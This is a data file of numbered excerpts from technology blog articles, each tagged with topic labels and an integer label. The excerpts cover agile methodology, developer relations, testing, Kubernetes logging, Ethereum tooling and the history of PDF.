672,"In the simplest model, to deliver a product, we need to hire a number of analysts, architects, developers, testers, infrastructure engineers and support. In the waterfall phased approach, only one group at any given time can be fully utilized. In the meantime, the other groups remain idle or, what is worse, use the extra time to overdo tasks at hand, negatively impacting colleagues. While it is tempting to assign groups to other projects for the period of low utilization, this would increase Distance To Product (DTR). The distance plus cost of task switching lower overall productivity. From the above, it is obvious that a model, which offers full occupation of all groups at all times, would provide a much higher Return On Time Invested (ROTI).","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",1
673,"In the waterfall model, a lot of responsibility is placed on architects to provide the initial technical design. This is an ungrateful task as hardly ever enough information is available at this stage to provide comprehensive design and so architects are doomed to failure. This causes disparity between what is really implemented and what was originally planned. In the meantime, architects provide more design in line with Parkinsons Law. As the technical design grows, so does its distance from what developers really do. This in effect causes architects to provide even more designs to get a grip on things and thus creating a vicious circle. To the point that architecture faction is expanding to meet the needs of expanding architecture faction. The mechanism can be observed in other factions of disintegrating teams. What makes it particularly noticeable in the case of architecture is the compounded effect of self-preservation instinct. It is more and more frequent that the whole software development team takes responsibility for providing design, thanks to enhanced education and improved tooling. In effect, we dont need architects for architecting, the same way we dont need typists for typing. That feeling of inevitable extinction only strengthens the vicious circle as more design is created by architects in order to prove the worth of architecture. Of course, the situation described here applies to technical architecture, not enterprise architecture in cross-cutting domain.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
674,"The process of creating software is unpredictable by its nature, we never really know what we end up with. That renders useless the big upfront plan preferred by the waterfall model. Even medium-term planning is crippled with a high dose of uncertainty. As such scientific management approach is inapplicable, coding is not a repeatable task and there is no tangible measure of performance (like locpm, lines of code per minute); each day in the life of software development team is different. In fact, the more creative a task is, the less Taylorism can be applied.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
675,"A self-organizing system would consume energy and order from its environment to improve its order. That order must be directed towards increasing productivity. That means that development teams are encouraged in various ways (recognition, job satisfaction, training and personal development, position, shame, pizza, threat, etc) to tunnel their energy towards building product. Without these incentives the system order can easily be optimized to serve non-productivity purposes like increasing individual ego, revenge, schadenfreude. Self-organising team proved to be very efficient form of management.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
676,"Agile software development approach was built on key concepts: Cross-functional, multi-skilled, self-organizing, domain-specific teams Continuous improvement Frequent delivery Adaptive rather than predictive model People-oriented rather than process-oriented We can see that using these simple concepts resolves, or at least significantly improves, the issues highlighted above. Agile teams work closely towards common goals and therefore avoid pitfalls of disintegration. The specification becomes an outcome of the whole team effort, avoiding problems of insufficient model accuracy. Requirements change is a very welcome opportunity to improve the product. Self-organization is an important aspect of improving productivity and responding to changing environment. Also, the impact of external agency of response is more likely to provide positive reactions, often reducing negative second-order effects. The team work is organized around frequent releases, naturally removing any inefficiencies. Capacity of all team members is fully utilized at most times, thus reducing their distance-to-product and improving overall ROTI.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
677,"The following iterative model is a typical representation of Agile approach: By no means is the Agile approach a magic wand, that can fix all the issues. The issues range from lack of long-term project visibility to limited career progression to dependency on team collaboration. There are types of software systems or organisations that would clearly not benefit from adopting Agile. Many methodologies that were built on Agile are of various quality. This might be off-putting for newcomers. In fact, issues of Agile approach entail a whole separate article.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
678,"Still, the Agile approach is the most powerful concept in modern software development lifecycle management. It has proven to be efficient and provide better results. What makes it so attractive is that the essence of Agile is to improve and evolve constantly. And nothing can summarize it better than these humble, but wonderful words of the manifesto:[1] For the record, I dont believe that developer-centric technocracy is a good thing. Like with everything in life, balance is required, and if we forget the service-oriented nature of our work, the great pendulum of history will eventually swing back and we might not like what comes next. [2] Martin Fowler (2018) The State of Agile Software in 2018, available: __url__ D.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",12
679,"H. Lawrence (1936) Study of Thomas Hardy[23] Robert C. Martin (2008) Clean Code[24] Obviously a paraphrase of Oscar Wildes The bureaucracy is expanding to meet the needs of the expanding bureaucracy. [25] Also known as Taylorism (Frederick Winslow Taylor (1911) Principles Of Scientific Management): It is only through enforced standardization of methods, enforced adoption of the best implements and working conditions, and enforced cooperation that this faster work can be assured. And the duty of enforcing the adoption of standards and enforcing this cooperation rests with management alone[26] Katia Caldari (2007) Alfred Marshalls critical analysis of scientific management[27] Von Foerster (1960) On self-organizing systems and their environments[28] Ashby (1962) Principles of the self-organizing system[29] Tribus, Myron (2001) Lessons from Tomas Bata for the Modern Day Manager[30] Robert C. Martin, et al (2001) Manifesto for Agile Software Development, available: __url__ change.","['Agile', 'Software Development', 'Technology', 'Leadership', 'Project Management']",5
680,"Infrastructure library provides users abstractions to deal with IO, Service Boilerplate, Consumption some of which has been detailed in earlier posts: F# Microservice Patterns @ Jet.com Abstracting IO using F#Having our services handle external interactions through a common interface allowed us to inject metrics and monitoring capability quite easily. To provide consumers a robust metrics/monitoring solution users needed the ability to enable/configure metrics for multiple metrics sinks without having to instrument any of their external interactions. But, our library also needed to provide some additional interfaces to allow users to produce their own custom metrics. We determined that any generic monitoring and alerting design would need to support both structured events and metrics. Knowing that we wanted to support both metrics and events we needed to define what each would be used for: We determined that the any generic alerting/monitoring design needed to meet the following requirements: A single event/metric interface that supports all our current metrics solutions; this event/metric must be extensible enough to support any future metric solutions. The library needs to support converting custom events into a metric. Note: This is done by buffering custom events and then aggregating/averaging the value before pushing the metric.","['Monitoring', 'Fsharp', 'Observability', 'Software Development', 'Software']",10
681,"Infrastructure users to make modifications when event shapes needed to be changed. We came up with the following definitions: These two types were designed to be able to represent all of our current use cases for metrics/events. Note: For this post, I will use the terminology of metrics/events interchangeably as Metrics can be converted into Events. The conversion is done by the backing-store specific implementation, for instance with New Relic; we buffer events into a sequence that is aggregated into metrics before being pushed. Some examples of common events: Note: MSP (Member Services Portal), OMO (Order Management Operations)The examples above only represent a small sample of the different types of Metrics that we need to be able to have systems visibility and monitoring. In order to have a single metric module that provides all the required interfaces without having to leak any of the details of the underlying implementation, two writer interfaces were created: All of the underlying infrastructure implementations for writing the metrics need to adhere to the above signature in order to be able to integrate with the common interfaces provided by the Metrics module.","['Monitoring', 'Fsharp', 'Observability', 'Software Development', 'Software']",8
682,"In the above example we are configuring three different metrics sinks, but for each of these sinks, we only want to emit specific metrics. We can do this by setting a filter field in the configuration type, i.e., splunk Metrics Enablednew Relic Metrics Enabled, generic Metrics Enabled. The filter field allows us to specify a predicate Metrics Config.filter: Custom Event bool which controls which metrics/event are published. An example of this filter below: The filter above is saying that only events/metrics with a label equal to Workflow Started, Workflow Completed, etc. should be pushed to the metric sink. If I wanted to enable all metrics to be pushed I could do something like this: By setting the configurations above in our service, this ensures that all our external interactions are appropriately instrumented. As we wrap metrics functionality around all our IO, i.e.","['Monitoring', 'Fsharp', 'Observability', 'Software Development', 'Software']",8
683,"With the project now unboxed (or inited) and local on our machine, we notice a folder structure within our root project directory; a structure that Truffle adheres to throughout its examples and through the init command; namely contracts/, migrations/ and tests/. As well as these folders, a __url__ file will also be joining the party, acting as a configuration file for Truffle. Lets visit what these folders consist of.contracts/hosts your Solidity (.sol) and Vyper (.vy) contract files. All your smart contracts associated with your project are stored in this folder.migrations/hosts your migration files. Lets stop here and define migrations in more detail. Migrations are files written in Javascript that programatically deploy smart contracts onto an Ethereum blockchain.","['Ethereum', 'React', 'Software Engineering', 'Smart Contracts', 'Programming']",7
684,"We now need to deploy them on a network and connect to that network to access said contracts. (network in this context meaning Ethereum blockchain). What is left to explore is how to connect to an Ethereum network in Truffle. This is handled in truffle-config.js, sitting in your project root __url__ allows us to configure networks wed like to connect to. The default configuration looks like this:truffle-config.js: As you can see, a development network has already been configured for localhost. By default Truffle Develop runs on localhost:9545 whereas Ganache runs on localhost:8545. Truffle is ready to communicate with Ganache out of the box. These blockchains are also assigned a random network ID that has no relation to real-world public Ethereum blockchains (the mainnet is network ID 1, for example).","['Ethereum', 'React', 'Software Engineering', 'Smart Contracts', 'Programming']",11
685,"This abstraction or commoditization that occurs in software is a really magical thing. A driving force of that is the open source movement. Someone notices they need to do something over and over again, and that thing is difficult. They build a tool to make it easy for themselves to do that thing. They open-source that tool so others can use and improve it. Of course, its not always that noble; open-sourcing can happen for a variety of more material reasons, too, but the result is still the same. Commoditization in other industries tends to be a lot less noble, and usually driven more by market forces and competitive dynamics. People dont often provide tools for free. They realize that its better to be the weapons supplier than participate in the war.","['Machine Learning', 'Software Development', 'Programming', 'Computer Science']",16
686,"One really interesting area where this abstraction commoditization is happening right now is Machine Learning. Its getting easier and easier to do Machine Learning, and for someone who isnt an ML specialist, thats really empowering. Theres a few things that make the process of ML commoditization really exciting to watch and hard to predict: The field itself has been around for dozens of years, but has picked up a lot of momentum in the past few years, due to abundance of data and compute, break-throughs in hardware (e.g. GPUs), and a flurry of activity in the field. Theres all sorts of interactions between academia and industry, and people who have been doing this for ages and people with new ideas. This can result in interesting debates and drama.","['Machine Learning', 'Software Development', 'Programming', 'Computer Science']",5
687,"To receive regular news about our research about software at KTH Royal Institute of Technology, shoot an email at repairnator.subscribe@4open.science! Martin[1] B. Danglot, P. Preux, B. Baudry and M. Monperrus (2017) Correctness Attraction: A Study of Stability of Software Behavior Under Runtime Perturbation. [2] E. W. Dijkstra (198812) On the cruelty of really teaching computing science.","['Research', 'Software Engineering']",5
688,"This term Developer Relations isnt really all that new in terms of Technology roles / lingo, with it first appearing in Google results on February 3, 2000. Defining it, however, is an exercise in he said/she said/they said with numerous definitions and processes and misunderstandings in abundance. For the purposes of what I am relating here (SWIDT?) I will define it as: Eloquent, right? I mean, I didnt skip college for nothin! (Not exactly true, but not the subject of this diatribe. )Ok, so lets use a definition which is a bit more elegant from Mary Thengvalls The Business Value of Developer Relations: Yeahthats a bit better. And what I really like about this one (as opposed to my terrible attempt at a lame joke), is that it encompasses so many activities (meetups, coffee with devs, conferences, community forums, etc.) which can roll up into how you build relationships without saying anything you have to do. Except build relationships with the developer community. So with that definition in mind lets continue on.","['Devrel', 'Developer Relations', 'Community']",12
689,"When we came in, on the first day, we removed all of those signs. I dont recall what we did with them exactly, but I want to say we burned them. We did continue to find signs throughout the shop over the ensuing months, and each one had their own level of absurdity. One of the first things we did though, after hosting a staff weenie-roast around the sign bonfire, was to start interacting with people by getting to know them, asking their names, and encouraging the staff to do so as well. From those early activities saw that people noticed.","['Devrel', 'Developer Relations', 'Community']",0
690,"This afore-mentioned passion served me well when I would engage with our customers and begin to educate them on what a good cup of coffee should be, and what they would likely enjoy. It wasnt uncommon for me to convert someone who required their coffee be equal parts milk, sugar, and coffee into a straight, black coffee drinkerall because I found out what they were looking for, wanting, and even (for some people) needing by asking, listening, and building a relationship with them. Douglas Adams said it best,See, thats Dev Rel to a T in my opinion. You have a product you are evangelising, and it requires that you actively listen, ask questions, build relationships with those developers using the product. Its not always about pizza and beer (doesnt hurt either), but it is about being intentionalits about being real. Developers can see through the marketing and sales bulls&*$ which so often is sent their way, and are willing to listen and try your product if/when they trust you. And that trust doesnt happen immediately.","['Devrel', 'Developer Relations', 'Community']",0
691,"Water One could make the argument that nothing impacts a cup of coffee more than the water used, and they have a point. You cant have a cup of coffee without it. You can certainly use tap water, with some cities having better than others. Unfiltered water carries all sorts of things which can affect the taste of your coffee. Because of this, I recommend using filtered water, either in bottle form or from a filter-system like your fridge might have. It may not be coffee shop level filtering, but its better than nothing.","['Devrel', 'Developer Relations', 'Community']",17
692,"Barista The person making your cup of coffee, which could be you, is importantand you should tip them accordingly. With that out of the way, training is essential to making sure that the drink being made is done so with precisionbut it doesnt stop with one training session, its a continual process. I would often do spot-checks on my baristas to make sure they were doing things correctlybecause the product we were producing depended on it. The word barista literally means someone who prepares coffee. I wont go into my usual tirade about how being a button-pusher on an espresso machine doesnt mean someone is a barista as they arent the entity preparing the coffee. Because that tirade delves deeply into emotion and you DONT WANT ME TO GO THERE. Beans The final component of a good cup of coffee is the beans. I mean, why go through all of the trouble to make sure the other things are top-notch, and then bomb it at the end with a crappy choice in beans? And lets not forget that the roast of the beans matters as well. Ive seen good quality beans ruined by being over-/under-roasted, and nothing makes sure an angel doesnt get their wings than that! This plays into the coffee has flavour from above. The oils naturally found in the coffee bean are where the flavour comes from, and the roasting process brings them out. However, if you dont get the right roast then the flavour wont be fully realised, and in order to get the right roast it requires trial and error by the roaster.","['Devrel', 'Developer Relations', 'Community']",0
693,"Too often this word is missing from developer relations programs, and so lets level-set what a good definition is. As a member of a devrel team, being able to understand, be aware of, sense, and experience the feelings and experiences of the developers youre trying to is essentialand I would suggest that there is no more important trait that a developer relations professional can have. Sure they should have technical chops, but that should be secondary or thirdary (its a thing I assure you) to empathy. They are to advocate for the developer / customer back to Product, Engineering, etc. and should have an acute understanding of all that they are experiencing. It is highly likely that the devrel team will come in contact with real users of the product exponentially more times than anyone else in the companyand as such its important they employ empathy. Developers dont care that you know, until they know that you care. Thats where your empathy shines through.","['Devrel', 'Developer Relations', 'Community']",12
694,"Community If youve spent any time around me youll know how passionate I am about community: how theyre formed, how they function, whos in them, what makes them unique, etc. Its why I finally made them a full-time career a few years ago instead of as just a hobby and obsession (not the stalker or alien kind of course). Those same communities are as unique as each coffee bean is, and need to be nurtured, listened to, and utilised to grow your reach and impact. That may come in the form of superuser or Ambassador programs, or in Office Hours, or via podcasts, User Days, etc. Dont forsake the offline for the online eitherits just as important. Make sure youre present in your community, either personally or as a sponsorship of some sort at least. A lot could be written on this subject, which will follow in the near future I am sure.","['Devrel', 'Developer Relations', 'Community']",2
695,"People on the team are important though. And if youre a member of a Dev Rel team, or are the only Dev Rel in the organisation, you matter. Make sure that you and your team are building the relationships necessary to be successful, and also to learn and grow. Listen to Dev Rel podcasts (Community Pulse, Dev Rel Radio to name a few), attend conferences like Dev Rel Con, join Slack groups like Dev Rel Collective all of these help build into you as a Dev Rel professional and help you build relationships with others in the industry. Ive met some amazing people who have become great friends while being part of Dev Rel, and Ive learned some great things from the conversations, chatter, articles, conferences, etc. Dont forsake theseif only for your own sanity.","['Devrel', 'Developer Relations', 'Community']",0
696,"Fresh Product The message youre trying to convey about your product is one which may become stagnate or not hit the mark with the audience youre targeting. But dont let it stay there. Every talk you give, every piece of swag you give out should be customised to the event in question. That doesnt mean you write something new each eventbut it does mean that you might have to make some minor tweaks to speak on Authentication at Gopher Con as well as Vue Conf, or have a set of t-shirts or stickers or socks for a Javascript conference and for a.","['Devrel', 'Developer Relations', 'Community']",19
697,"In 2010, after two years of my wife and I each having two full-time jobs and three kids, we sold our coffee shop. We had built back up the business, grew awareness further outside our area, attended coffee conferences and represented companies, was featured in an industry magazine, and it was all great. But it was also extremely hard, very taxing on our kids, our relationships with others, and our marriage. We came to one critical realisation: we knew we could have a successful business, or know our kids and have a family. And they will win out every time. And we dont for one second regret selling. Sure we miss not having an espresso machine in the house, or we miss being able to make our own cappuccino or latte when we know from the sound of the milk bring steamed or watching the barista make grind and pour the shots how the drink is going to tastefrom across the room. But what we miss the most, and was the hardest to get used to, was the loss of community we had after spending day-in and day-out with the patronsand frankly as I look back its the things I learned through coffee which influence how I view Developer Relations today. Because Dev Rel is like coffee.","['Devrel', 'Developer Relations', 'Community']",2
698,"During this phase you remove accidental shortcuts from your code. Generalise, but just enough to pass the tests. What Refactoring does to your code is that it makes it ready for future changes.","['Software Development', 'Software Testing', 'Test Driven Development', 'Learning']",13
699,"So not the tests but the ability to change confidently is the key property of Test-Driven Development. With TDD you can start small and shoot the stars! I will first let this soak in. This question actually produces kind of a bomb explosion effect: How can one respond to THAT? Here we come close to the understanding why TDD is not a silver bullet. It is pretty strict, so once you do not comply just a bit, you do not comply at all, and lose most of the benefits. Thats what will happen if you try to use TDD in a legacy software project. It will take enormous time to reach desired level of test coverageand would be impossible to do safe refactoring before that.","['Software Development', 'Software Testing', 'Test Driven Development', 'Learning']",13
700,"Line 1: The FROM command defines the base container image. In this case, well use the official N __url__ image available in the Docker Hub. Notice were not explicitly referencing a container registry for this image. This means well pull down the N __url__ container image from the default container registry (Docker Hub). Also note that the image uses an alpine tag. This means well use the N __url__ container image based on Alpine Linux, which is a Linux distro designed for security and resource efficiency. It will allow us to keep the container image very small at less than 90 MB in size.","['Docker', 'Azure', 'Containers', 'Nodejs', 'DevOps']",7
701,"One of those dreams of the late 1980s was quite simple, but profoundly difficult to imagine a solution forthe ability to transfer, view and print a document exactly the same between different computer systems and applications. Today, its a ridiculous thing to even ponder. We can all exchange any type of media in exact fidelity to anyone, anywhere, anytime. But, this was still relatively early in the history of PC software, the age of incompatible operating systems and file formats. The World Wide Web was still years away from making its debut. People couldnt even count on getting a simple Word documents fonts and layout to look the same between a Mac and PC, never mind Unix.","['Design', 'Adobe Acrobat', 'Pdf', 'Mac', 'Software']",16
702,"A skunkworks project like Carousel was a welcome relief from shock of working in a large corporate culture, so everyone threw themselves into it with startup determination. No one wanted to let Randy down in delivering a truly compelling vision of how this could work for Warnock. But, the team clearly needed help from some of the key Adobe engineers to assist with the technical proof. Mike Schuster had already been helping Pell tear the rasterizer out of Adobe Illustrator to create a separate code library (codenamed SAL or Smart Art Library) to be used by future applications. This work would turn out to be a key element of the Carousel demo. Ivar Durham helped Pell and Woodruff modify the Post Script Interpreter to convert output to a new interchange file format to be shown on-screen. Woodruff and Pell also worked with Richard Cohen to understand how to modify the existing Adobe Illustrator file format to accommodate multiple pages for the purpose of the technical demo.","['Design', 'Adobe Acrobat', 'Pdf', 'Mac', 'Software']",12
703,"Finally, after several weeks of working on these hard problems, Randys team was ready for a meeting with Warnock to show him some demonstrable progress. Holt had done an amazing smoke and mirrors code mockup on the Mac of a universal viewing application complete with page thumbnails and fast page views (truly innovative for the time). Hall had coded a lean parser to read the new interchange format into a custom viewing app, to which Pell had hooked up the SAL rasterizer to display page content onscreen (proof the app could open and draw very fast). Woodruff had figured out how to construct a variant of the Adobe Illustrator native format to be used as an interchange file (the precursor to Portable Document Format, PDF). Boosman had gathered enough insight and knowledge from key Adobe people to form an initial product plan. The demo script was worked out and the team was ready for their date with destiny.","['Design', 'Adobe Acrobat', 'Pdf', 'Mac', 'Software']",6
704,"Over 25 years later, this truly breakthrough innovation (electronic document interchange) still stands as one of the greatest advances for business productivity and communications. Carousel was key to getting what would eventually be known as Acrobat and PDF off the ground, and its team should be recognized as true pioneers they are. M. Pellexcerpt from On the Carousel Bold, insightful and uncompromising, M. Pell is recognized as a thought leader in the field of Holographic Visualization and Smart Information.","['Design', 'Adobe Acrobat', 'Pdf', 'Mac', 'Software']",16
705,"In this tutorial, we explore Kubernetes logging architecture and demonstrate how to collect application and system logs using Fluentd. We also look into some details of the Fluentd configuration language to teach you how to configure log sources, match rules, and output destinations for your custom logging solution. Docker containers in Kubernetes write logs to standard output (stdout) and standard (stderr) error streams. Docker redirects these streams to a logging driver configured in Kubernetes to write to a file in JSON format. Kubernetes then exposes log files to users via kubectl logs command. Users can also get logs from a previous instantiation of a container setting the --previous flag of this command to true. That way they can get container logs if the container crashed and was restarted.","['Kubernetes', 'Fluentd', 'Logging', 'Monitoring', 'Kubernetes Tutorial']",7
706,"Lets assume you have an application container producing some logs and outputting them to stdout, stderr, and/or a log file. In this case, you can create one or more sidecar containers inside the application pod. The sidecars will be watching for the log file/s and an apps container stdout/stderr and will stream log data to their own stdout and stderr streams. Optionally, a sidecar container can also pass the retrieved logs to a node-level logging agent for subsequent processing and storage. This approach has a number of benefits described in this great article from the official documentation. Lets summarize them: With sidecar containers, you can separate several log streams from your app container. This is handy when your app container produces logs with different log formats. Mixing different log formats would deteriorate manageability of your logging pipeline.","['Kubernetes', 'Fluentd', 'Logging', 'Monitoring', 'Kubernetes Tutorial']",7
707,"You should provide some environmental variables in order to connect to your Elasticsearch cluster. These are your Elasticsearch host, port, and credentials (username, password). You can connect to either Elasticsearch deployed in the Kubernetes cluster or remote Elasticsearch cluster as in this example (we used a Qbox-hosted Elasticsearch cluster)Fluentd needs root permission to read logs in /var/log and write pos_file to /var/log. To avoid permission error, set FLUENT_UID environment variable to 0 in your Daemon Set manifest Lets save the manifest in the __url__ and create the Daemon Set: If you are running a single-node cluster with Minikube as we did, the Daemon Set will create one Fluentd pod in the kube-system namespace. You can find its name using kubectl get pods --namespace=kube-system and use kubectl logs <fluentd-pod-name> to see its logs: Almost immediately, Fluentd will connect to Elasticsearch using the provided host and credentials: To see the logs collected by Fluentd, lets log into the Kibana dashboard. Under the Management -> Index Patterns -> Create New Index Pattern, youll find a new Logstash index generated by the Fluentd Daemon Set. Under the hood, Fluentd uses Logstash as the intermediary log shipper to pass logs to Elasticsearch. After configuring a new index pattern, youll be able to access your app logs under the Discover tab (see the image below).","['Kubernetes', 'Fluentd', 'Logging', 'Monitoring', 'Kubernetes Tutorial']",7
708,"When I was assigned the challenge to learn how to code automated tests my first thought was: It was after that I experienced the famous test driven development that I realized that I was making APIs inefficiently all along! I tell my experience as a beginner in the TDD world in this post. The intention of this text is to share everything that I know about tests. Are you ready to become a MASTER TESTER? Making an abstraction similar to Kent Beck in his book Test-Driven Development By Example programming and beating challenges is like exploring a dark room, you are not entirely sure where you are going, your manual tests are nothing but flashes of light that gives you a glimpse if you are going in the right way or not. Automated tests in this example serves as a flashlight. You can see much clearer, but in order for your flashlight to work you have to make sure it is energized with batteries (which are your automated tests). Automated tests are like this, it gives you a much more lucid insight about the consistency and quality of your software, it doesnt show you the full picture, but if you feed it correctly with code that automates your exploration, you will be much safer than just flashes of positive tests made manually.","['Software Development', 'Test Driven Development', 'Testing', 'Software Engineering', 'Automated Testing']",13
709,"One of the outputs should be a de facto list. Meaning, for each capability there should be a standard corporate solution. Example: Document storage and Collaboration: Dozens of options exist. 365, Google Docs, Sharepoint, One Drive, Drop Box and the list keeps going. But whats the defined corporate supported platform, that everyone should use? Measure: Gather the costs associated with each application based on licensing, support, productivity, risk, and migration impacts. Its also a good idea that the license information is stored within the same place and process. This will help to ensure you are properly utilizing the contracted licenses. The cost metrics will help you to determine which ones are the highest priority to decommission. During the measuring stage your architecture, development, infrastructure, and Info Sec teams should be reviewing, comparing and contrasting the applications to determine what makes sense to continue using. This step will consume a considerable amount of time. Its not necessary to complete the entire list of applications before moving to rinse and repeat.","['Technology', 'Rationalization', 'App Rationalization', 'Consolidation', 'Managing Technical Debt']",10
710,"Rinse: Before you start to negotiate with the various application owners, you have to gain executive sponsorship. Getting this provides the top down push that will be required to be successful. The right sponsor would be a CFO. If you do not have an executive level driven initiative, the share weight of the pushback will cause most of the efforts to fail. This is the reason why I recommended the Measure phase first. It gives you the financial and productivity impact numbers to be able to push for the change. It can be very beneficial to promote this as being a positive thing for the application owners. Demonstrate that it is an opportunity for improvement.","['Technology', 'Rationalization', 'App Rationalization', 'Consolidation', 'Managing Technical Debt']",0
711,"Repeat: Your biggest obstacles will not be technical ones. I can guarantee it will be political. Migrating from any solution to any solution can be done. I dont want to sound like I am trivializing the efforts needed. But the hurdle you will have to overcome is before you can execute, you need buy-in. People get very emotional and attached to their solutions and change is always tricky. This is the primary reason why executive sponsorship with frequent milestone updates is required.","['Technology', 'Rationalization', 'App Rationalization', 'Consolidation', 'Managing Technical Debt']",1
712,"This is an important question to ask yourself. What do you need to test? What happens if you dont test? Having the correct understanding and motivation for testing I believe is crucial. Having bugs in your software can be costly to your company. The monetary costs to your company, as well as to your users can be huge. We see this type of thing all of the time in software. Some bugs maybe annoying or inconvenient to their users, where others can be more serious and can cause loss of life.","['Software Development', 'Testing', 'Software Testing', 'Product Management']",13
713,"Another expectation I have of my internal testers is to try to find ways to break the software. This can include functional and non-functional testing. An example of this would be, if I am testing a payments system, I would include a number with more than two decimal places. Or I would include an astronomically large number or small number. I would try to include a non-number. To assume a user is going to use your system in the way you intended it is a very false assumption to make. You need to think of all of the potential ways that someone could potentially make inputs.","['Software Development', 'Testing', 'Software Testing', 'Product Management']",13
714,"I tend to give the users a limited amount of information as possible. I do not want to bias the testers. I want them to use the software in the way they are used to and not in the way I want them too, or assume them to be using it. Below is some of the information I will typically give them: What they are testing Training on how to use it Features I need them to test Limitations (if any) of the new feature How to reach out if there are issues Periodic check-ins with your external testers is critical. I will often get on the phone with them and walk them through a few tests to make sure that things are looking and functioning as they expect it too. Having those phone conversations (if possible) with your some of your users can also help you to understand more of how your users are using the software, as well as you can clear up any miscommunication fairly easily and quickly with a phone conversation versus an email exchange.","['Software Development', 'Testing', 'Software Testing', 'Product Management']",0
715,Test scripts are one of those things that you should consider to be a living document. Every release you need to use and revise your test scripts. What new features were added where new testing needs to be added? What testing has just been left out? Have you had other key stakeholders review your test scripts to make sure nothing has been omitted? I have found the most helpful way to revise and edit my test scripts is to do a full regression test of the software. I would encourage all of your testers (internal and external) to do this at least once every release cycle.,"['Software Development', 'Testing', 'Software Testing', 'Product Management']",13
716,"Another important aspect of your test scripts, is to test them to make sure they are still relevant. I can be important to include load and security test scripts. You should include tests that should potentially make your software fail. This includes both manual and test scripts used in automated testing. I have worked with teams who have done automated regression testing. They went years without updating anything. We did an audit of their test scripts, only to find out that they were in desperate need of updating, and many of them gave false positives (or negatives).","['Software Development', 'Testing', 'Software Testing', 'Product Management']",13
717,"Key concept: overfitting and cross validation This is where the separation between training and validation data comes in. Looping back to Y=f(X), we get to the idea of creating/training a model. If you look at the graph below, imagine the black dots represent just the training data. The blue line is a highly fitted model, meaning it very accurately predicts the training data. But, if you were to use the blue line to predict new data points (validation, test, or live data), it probably wont be very accurate. It would be better to use a more general model, such as the black line which is just a simple linear model.","['Machine Learning', 'Data Science', 'Numerai', 'Beginner', 'Tutorial']",14
718,"During the autumn of 2015, I was developing a platform to stream short live video feeds. There were several problems with streaming live videoread further for details. The final solution is a platform with 4 services: Live Streaming service VOD Streaming service Real-time Communication service REST API service Our live videos are short20 seconds. Our client App uses RTMP to continuously upload a live video. We use RTMP to stream live videos, too. We do not use transcoding for live streams. The live video latency on the watcher side is 5 seconds. Ive been developing it for two months with zero knowledge about streaming at the beginning.","['Live Streaming', 'Development', 'Backend Development', 'Architecture']",6
719,"My own collection grew as I learned about software and systems: First turquoise blue spines for Learning Perl and Programming Perl; I wanted to make my little web pages do things, process input, respond to actions. Darker blues for Essential System Administration, since I needed a server to run those scripts, and DNS and BIND, since if Id ever be able to share my work, Id need a name server. For my birthday, my parents friend (who slept on our couch when he came to the Valley for work) gave me a copy of Exploring Java to add to my collection. With each book, I felt the promise of a new skill. With each shelf, I felt my explorations solidifying into a body of broadening knowledge. For each topic, I could read an OReilly Learning ___, graduate to an OReilly Programming ___, and, my training complete, make regular use of an OReilly ___ in a Nutshell or an OReilly ___: The Definitive Guide.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",2
720,"Those shelves full of books, mine, my parents, their friends, their colleagues, perhaps it was like lawyers posing for photos in front of leather-bound volumes. Do they ever use those books? Or is it a movie set, brought in for each years new partner portrait session? This mixed value of technical books as references and as decorations was most apparent to me during the summer of Java, when Sun Microsystems and Addison-Wesley began publishing a comprehensive series of hardbacks on the new language. Overviews, introductions, specifications everything for this new programming language could and would be found in one of these books. I happened to be teaching at a computer camp that summer, and the director of this Java book series happened to be the mother of one of the campers. Each week, shed stop by with another box full of free books to share. Wed all grab a few, indiscriminately, going more for heft than topic. Did I need a detailed review of one particular Java GUI framework? No, I had stuck a bookmark in my Exploring Java and not returned to it since. Then again, I was building a library, so I took it.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",2
721,"My mom has spent the last two years driving to Half Moon Bay, on the Pacific coast most every day. She brings a beach chair, a stack of papers, and a laptop. She says hello to the ranger as she drives in to the parking lot, and each day he asks her how the books are coming along. At first he was playful, thinking it a joke, this writing-a-technical-textbook-on-the-beach activity of my mothers. Over time, hes grown accustomed to her arrival and realizes the papers are real publishers proofs.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",2
722,"Finally she and her co-authors have received copies of Supporting Web Servers and Analyzing E-Commerce and Internet Law in the mail. There are a few of them for me too, since I earned a spot on the covers for my own name by writing all the quizzes and problem sets that sat at the end of each chapter. (High school was training me all too well how to write and answer multiple-choice questions and essay prompts. )This is the height of the World Wide Web in its first boom cycle. This is the early, promising days of e-commerce. And yet neither book makes much of a difference. Theyve been held up by a year of publishers delays, the technical meat of the books went stale while the proofs sat with the publishers marketing arm. That material would have been more valuable if it went directly from my mom and her laptop on the beach (and her co-authors around the country) directly to the basement of the Stanford technical bookstore annex, bypassing a marketing department in northern New Jersey and its plans for a grand roll-out.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",2
723,"But this model has also ruined the logical progression and structure that publishers like OReilly offered. The Android SDK was released in late 2007. OReillys first titles with grassy green spines under its own English imprint didnt arrive until mid 2011, when they released Developing Android Applications with Adobe AIR, Developing Android Applications with Flex 4.5, Learning Android, Programming Android, and Application Security for the Android Platform. In the intervening years, I had been struggling to learn to develop Android software. Stack Overflow Q&A had helped a bitits the immediacy of my downhill neighbors, although lacking the camaraderie or the context of an ongoing conversation. In-person classes, despite their cost were helpful. (By chance, my instructors wrote up their notes and those became OReillys Learning Android.) So given how Id been pursuing Android from 2007 to 2011, that onslaught of OReilly books felt like too much, too late. The longer titles attempted to document APIs that were changing from month to month. The shorter titles, each 114 pages in length, read like long blog posts about overly specific, almost arbitrary topics. I had sinking confidence in OReillys author-to-printer pipeline to keep either the intro titles or the definitive titles up to date. Unlike the summer of Java, when the software developer and the publisher worked together, these were not books I wanted to add to my library, in physical or electronic form.","['Programming', 'Books', 'Publishing', 'Software Development', 'Libraries']",16
